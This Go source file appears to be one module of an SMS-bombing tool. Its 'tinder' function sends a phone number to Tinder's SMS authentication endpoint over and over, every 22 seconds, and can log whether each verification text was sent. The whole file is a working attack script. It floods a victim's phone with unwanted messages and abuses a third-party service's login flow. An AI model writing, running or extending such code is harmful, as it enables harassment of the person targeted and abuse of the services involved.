package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func tinder() {
	req := newreq()
	req.SetBodyString(`{"phone_number":"` + num + `"}`)
	req.Header.SetContentType("application/json")
	req.SetRequestURI("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru")
	req.Header.SetMethod("POST")

	timeout := time.Second * 22
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `sms_sent":true`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
